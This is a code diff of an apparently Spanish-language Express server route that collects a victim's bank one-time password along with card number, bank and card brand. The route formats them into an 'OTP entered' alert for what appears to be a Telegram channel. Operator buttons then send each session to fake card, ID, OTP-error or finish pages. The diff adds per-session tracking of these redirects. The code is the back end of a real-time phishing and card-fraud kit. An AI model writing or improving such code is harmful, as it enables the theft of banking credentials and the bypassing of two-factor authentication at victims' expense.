@@ -201,7 +201,12 @@ app.post("/otpcheck2", async (req, res) => {
   }
 
   try {
-    // Mensaje que se enviará al canal de Telegram
+    // ✅ Guardar redirección temporal
+    redirectionTable[sessionId] = {
+      target: null,
+      step: "otp-check2"
+    };
+
     const mensaje = `
 🔐 *NUEVO OTP INGRESADO* 🔐
 ------------------------
@@ -209,18 +214,17 @@ app.post("/otpcheck2", async (req, res) => {
 *Número:* ${info?.number || "Desconocido"}
 *Banco:* ${info?.checkerInfo?.bank || "N/A"}
 *Franquicia:* ${info?.checkerInfo?.company || "N/A"}
-`;
+    `.trim();
 
-    // Botones para redirección dinámica
     const buttons = {
       inline_keyboard: [
         [
-          { text: "Error Tarjeta", callback_data: "redirect_to:payment.html" },
-          { text: "Error Logo", callback_data: "redirect_to:id_check.html" }
+          { text: "Error Tarjeta", callback_data: `go:payment.html|${sessionId}` },
+          { text: "Error Logo", callback_data: `go:id-check.html|${sessionId}` }
         ],
         [
-          { text: "Error OTP", callback_data: "redirect_to:otp-check2.html" },
-          { text: "Finalizar", callback_data: "redirect_to:finish.html" }
+          { text: "Error OTP", callback_data: `go:otp-check2.html|${sessionId}` },
+          { text: "Finalizar", callback_data: `go:finish.html|${sessionId}` }
         ]
       ]
     };
